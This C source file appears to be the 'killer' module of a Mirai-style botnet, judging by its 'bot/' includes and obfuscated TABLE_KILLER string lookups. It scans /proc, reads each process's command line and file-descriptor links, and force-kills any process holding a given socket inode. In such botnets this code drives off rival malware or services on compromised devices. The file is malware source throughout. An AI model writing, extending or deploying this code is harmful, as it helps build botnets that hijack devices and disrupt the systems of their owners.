#include <ctype.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#include "bot/config/table.h"
#include "bot/definitions.h"

/* retrieves the cmdline */
size_t retrieve_cmdline_path(const char *pid, char *buf, size_t buf_len) {
  char path[4096] = {0};

  strcpy(path, table_retrieve(TABLE_KILLER_PROC, NULL));
  strcat(path, pid);
  strcat(path, table_retrieve(TABLE_KILLER_CMDLINE, NULL));

  table_lock(TABLE_KILLER_CMDLINE);

  int fd = open(path, O_RDONLY);
  if (fd < 0) return -1;

  size_t ret = read(fd, buf, buf_len);
  close(fd);
  return ret;
}

void killer_kill_by_inode(char *inode) {
  DIR *dir;
  struct dirent *entry;

  if ((dir = opendir(table_retrieve(TABLE_KILLER_PROC, NULL))) == NULL) {
    LOG_ERROR("failed ot open dir");
    return;
  }

  while ((entry = readdir(dir)) != NULL) {
    if (!isdigit(*entry->d_name)) continue;

    char path[4096] = {0};

    strcpy(path, table_retrieve(TABLE_KILLER_PROC, NULL));
    strcat(path, entry->d_name);
    strcat(path, table_retrieve(TABLE_KILLER_FD, NULL));
    strcat(path, "/");

    DIR *fd_dir = opendir(path);
    if (!fd_dir) continue;

    struct dirent *fd_entry;
    size_t base_len = strlen(path);

    while ((fd_entry = readdir(fd_dir)) != NULL) {
      if (!isdigit(*fd_entry->d_name)) continue;

      // append fd num to path base
      strcpy(path + base_len, fd_entry->d_name);

      // read the link (inode)
      char buf[4096] = {0};
      ssize_t len = readlink(path, buf, sizeof(buf) - 1);
      if (len == -1) continue;
      buf[len] = '\0';

      if (strstr(buf, inode) != NULL) {
        kill(atoi(entry->d_name), 9);
      }
    }

    closedir(fd_dir);
  }

  closedir(dir);
}
